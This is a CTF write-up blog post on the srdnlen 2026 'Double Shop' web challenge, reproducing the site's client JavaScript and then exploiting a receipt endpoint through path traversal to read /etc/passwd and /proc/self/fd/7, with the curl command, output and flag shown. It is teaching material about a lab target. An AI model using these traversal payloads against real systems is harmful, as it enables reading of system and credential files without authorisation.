---
layout: post
title:  "Double Shop"
date:   2026-03-05 20:10:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /srdnlen-2026-doubleshop/
---

**Title**: Double Shop

**Category**: web

**Author**: inn3r

**Description**: Welcome to the Double Shop! Kety & Tom have finally launched their new vending system, but the selection is... underwhelming. With only a few snacks and drinks available, the shelves feel empty.

If you want to suggest new products or expand the inventory, you’ll need to speak directly with the Manager. However, he is a peculiar character and notoriously hard to reach. He is known for playing double games and hiding behind a system that isn't always what it seems. Many have tried to knock on his door, only to be turned away without explanation. He enjoys the ambiguity of his own rules. The question is... can you reach him?

Website: [http://doubleshop.challs.srdnlen.it](http://doubleshop.challs.srdnlen.it)

I dont get any source code for this challenge. Looking at `view-source:http://doubleshop.challs.srdnlen.it/assets/vendor.js` I see this:
```js
(function(){
    const _p = [
        {id:"A1",n:"Classic Cola",p:3,s:4,i:"assets/img/cola.png"},
        {id:"B1",n:"Chips",p:2,s:6,i:"assets/img/chips.png"},
        {id:"C1",n:"Spring Water",p:1,s:10,i:"assets/img/water.png"}
    ];


    let _bal = parseInt(sessionStorage.getItem('v_bal')) || 0;
    let _hist = JSON.parse(sessionStorage.getItem('v_hist')) || [];
    

    let _inv = JSON.parse(sessionStorage.getItem('v_inv'));

    if(!_inv || _inv.length !== _p.length) _inv = JSON.parse(JSON.stringify(_p));

    let _sid = localStorage.getItem('v_sid');
    if(!_sid) { 
        _sid = Math.random().toString(36).substring(2) + Date.now().toString(36); 
        localStorage.setItem('v_sid', _sid); 
    }

    // --- UTILS ---
    const $ = s => document.querySelector(s);
    const nt = n => `$ ${n}`;
    
    const _save = () => {
        sessionStorage.setItem('v_bal', _bal);
        sessionStorage.setItem('v_hist', JSON.stringify(_hist));
        sessionStorage.setItem('v_inv', JSON.stringify(_inv));
    };

    const _toast = m => {
        const t = $('#toast');
        if(t) {
            t.textContent = m; 
            t.classList.add('show'); 
            setTimeout(() => t.classList.remove('show'), 2000);
        } else {
            console.log("Toast:", m);
        }
    };

    // --- RENDERING UI ---
    const _renderLog = () => {
        const list = $('#purchasedList');
        if(!list) return;
        list.innerHTML = '';
        
        if(_hist.length === 0) {
            list.innerHTML = '<li style="padding:10px; text-align:center; color:#ccc; font-style:italic">No transactions yet</li>';
        } else {
            _hist.slice().reverse().slice(0, 10).forEach(item => {
                const li = document.createElement('li'); li.className = 'log-item';
                li.innerHTML = `<span>${item.n}</span> <span>-${nt(item.p)}</span>`;
                list.appendChild(li);
            });
        }
    };

    const _updateUI = () => {
        if($('#balance')) $('#balance').textContent = nt(_bal);
        _renderLog();
    };

    const _renderGrid = (filter="") => {
        const grid = $('#grid');
        if(!grid) return;
        grid.innerHTML = '';
        
        _inv.filter(p => !filter || p.n.toLowerCase().includes(filter.toLowerCase())).forEach(p => {
            const card = document.createElement('article'); card.className = 'item-card';
            card.innerHTML = `
                <div class="thumb"><img src="${p.i}"></div>
                <div class="item-name">${p.n}</div>
                <div class="item-meta"><span class="item-price">${nt(p.p)}</span> | Stock: ${p.s}</div>
                <button class="btn-buy" data-id="${p.id}" ${p.s===0?'disabled':''}>${p.s===0?'Out of Stock':'Purchase'}</button>`;
            grid.appendChild(card);
        });
    };

    window.actionBuy = (id) => {
        const p = _inv.find(x => x.id === id);
        if(!p) return;
        if(_bal < p.p) return _toast('Insufficient funds');
        if(p.s <= 0) return _toast('Out of Stock');

        _bal -= p.p; 
        p.s--;
        _hist.push({n: p.n, p: p.p});
        
        _save(); 
        _updateUI(); 
        _renderGrid($('#search').value);
        _toast(`Purchased: ${p.n}`);
    };

    const init = () => {
        console.log("Vendor System Initialized"); 
        _updateUI(); 
        _renderGrid();

        const grid = $('#grid');
        if(grid) {
            grid.addEventListener('click', e => {
                if(e.target.classList.contains('btn-buy')) {
                    window.actionBuy(e.target.dataset.id);
                }
            });
        }

        document.querySelectorAll('.coin-btn').forEach(b => {
            b.addEventListener('click', e => {
                const amt = parseInt(e.target.dataset.amt);
                _bal += amt;
                _save(); 
                _updateUI();
                console.log("Added coin:", amt);
            });
        });

        const search = $('#search');
        if(search) search.addEventListener('input', e => _renderGrid(e.target.value));

        const btnRefund = $('#returnChange');
        if(btnRefund) {
            btnRefund.addEventListener('click', () => {
                if(_hist.length === 0) return _toast('Nothing to refund');
                
                let total = 0; 
                _hist.forEach(h => total += h.p);
                
                _bal += total; 
                _hist = [];
                
                _save(); 
                _updateUI(); 
                _toast(`Refunded ${nt(total)}`);
            });
        }

        const btnClear = $('#clear');
        if(btnClear) {
            btnClear.addEventListener('click', () => {
                _bal = 0; 
                _save(); 
                _updateUI(); 
                _toast('Balance cleared');
            });
        }

        const btnRestock = $('#restock');
        if(btnRestock) {
            btnRestock.addEventListener('click', () => {
                _bal = 0;
                _hist = [];
                _inv = JSON.parse(JSON.stringify(_p));
                
                _save();
                _updateUI();
                _renderGrid();
                _toast('System Reset & Restocked');
            });
        }

        const _base = "\x2f\x61\x70\x69\x2f\x72\x65\x63\x65\x69\x70\x74\x2e\x6a\x73\x70\x3f\x69\x64\x3d";
        const btnReceipt = $('#viewReceipt');
        
        if(btnReceipt) {
            btnReceipt.addEventListener('click', async () => {
                _toast('Generating receipt...');
                try {
                    // Prepara i dati per il backend
                    const formData = new URLSearchParams();
                    formData.append('sid', _sid);
                    formData.append('items', JSON.stringify(_hist));

                    const res = await fetch('/api/checkout.jsp', { 
                        method: 'POST', 
                        body: formData 
                    });
                    
                    if(res.ok) {
                        const fileTarget = (_hist.length === 0) ? "sample.txt" : `${_sid}.log`;
                        window.open(_base + fileTarget, '_blank');
                    } else {
                        _toast('Server Error');
                    }
                } catch(e) {
                    console.error(e);
                    _toast('Connection Error');
                }
            });
        }
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
```

Clicking on `Download Receipt` takes me to `http://doubleshop.challs.srdnlen.it/api/receipt.jsp?id=`.

This looks possibly vulnerable to LFI. I test for `/etc/passwd` with `http://doubleshop.challs.srdnlen.it/api/receipt.jsp?id=../../../../../etc/passwd` and it works:
```shell
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System 
(admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin 
tomcat:x:999:999::/home/tomcat:/bin/sh
```

I tried checking things like `/proc/self/environ`, `/proc/self/mountinfo`, `/proc/self/maps`, and `/proc/self/exe`. Then I go through `/proc/self/fd/0` to `/proc/self/fd/9`. On `/proc/self/fd/7` I see the flag! On `http://doubleshop.challs.srdnlen.it/api/receipt.jsp?id=../../../../../proc/self/fd/7`:
```shell
curl http://doubleshop.challs.srdnlen.it/api/receipt.jsp?id=../../../../../proc/self/fd/7 | grep "srdnlen{"  
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
Dload  Upload   Total   Spent    Left  Speed  
0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     028-Feb-2026 19:07:49.982 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/srdnlen{d0uble_m1sC0nf_aR3_n0t_fUn}]  
28-Feb-2026 19:07:50.103 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/srdnlen{d0uble_m1sC0nf_aR3_n0t_fUn}] has finished in [121] ms  
100 17680    0 17680    0     0  19789      0 --:--:-- --:--:-- --:--:-- 19776
```

`srdnlen{d0uble_m1sC0nf_aR3_n0t_fUn}`
